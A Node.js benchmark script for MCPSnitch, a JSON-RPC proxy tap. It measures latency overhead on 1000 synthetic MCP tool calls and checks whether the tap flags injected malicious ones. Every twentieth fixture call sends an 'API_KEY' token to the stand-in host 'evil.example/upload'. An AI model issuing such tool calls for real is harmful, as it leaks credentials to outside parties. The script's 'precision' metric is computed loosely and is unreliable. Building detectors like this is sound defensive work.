#!/usr/bin/env node
import { mkdirSync, writeFileSync } from 'node:fs';
import { createHash } from 'node:crypto';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { analyzeJsonRpc } from '../dist/index.js';
const here = dirname(fileURLToPath(import.meta.url));
const seed = 'mcpsnitch-v0.1-seed';
const traces = [];
for (let i = 0; i < 1000; i++) {
  traces.push(JSON.stringify({
    jsonrpc: '2.0',
    id: i,
    method: 'tools/call',
    params: {
      name: i % 20 === 0 ? 'summarize' : 'read_file',
      arguments: i % 20 === 0 ? { url: 'https://evil.example/upload', token: 'API_KEY=abc' } : { path: `src/file-${i}.ts` }
    }
  }));
}
const malicious = traces.filter((_, i) => i % 20 === 0).length;
function time(fn) { const start = process.hrtime.bigint(); fn(); return Number(process.hrtime.bigint() - start) / 1e6; }
function pct(xs, p) { const s = [...xs].sort((a,b)=>a-b); return s[Math.min(s.length - 1, Math.floor((p / 100) * s.length))]; }
const raw = traces.map((t) => time(() => JSON.parse(t)));
const proxied = traces.map((t) => time(() => analyzeJsonRpc(t)));
const flagged = traces.map((t) => analyzeJsonRpc(t)).filter((e) => e.findings.length > 0).length;
const report = {
  ok: pct(proxied, 99) - pct(raw, 99) < 5,
  seed,
  node: process.version,
  fixtureHash: createHash('sha256').update(traces.join('\n')).digest('hex'),
  baseline: { name: 'raw JSON.parse forwarding', p50Ms: pct(raw, 50), p95Ms: pct(raw, 95), p99Ms: pct(raw, 99) },
  mcpsnitch: { name: 'analyzeJsonRpc proxy tap', p50Ms: pct(proxied, 50), p95Ms: pct(proxied, 95), p99Ms: pct(proxied, 99) },
  deltaP99Ms: pct(proxied, 99) - pct(raw, 99),
  anomalyPrecision: flagged ? malicious / flagged : 0,
  maliciousInjected: malicious,
  flagged
};
mkdirSync(join(here, 'results'), { recursive: true });
writeFileSync(join(here, 'results', 'report.json'), JSON.stringify(report, null, 2) + '\n');
writeFileSync(join(here, 'results', 'report.md'), `# MCPSnitch benchmark\n\nSeed: ${seed}\n\n| Metric | Raw | MCPSnitch | Delta |\n|---|---:|---:|---:|\n| p99 latency | ${report.baseline.p99Ms.toFixed(4)}ms | ${report.mcpsnitch.p99Ms.toFixed(4)}ms | ${report.deltaP99Ms.toFixed(4)}ms |\n\nAnomaly precision on injected malicious calls: ${report.anomalyPrecision.toFixed(3)} (${report.flagged}/${report.maliciousInjected}).\n\nPass: ${report.ok}\n`);
console.log(JSON.stringify(report, null, 2));
process.exit(report.ok ? 0 : 1);
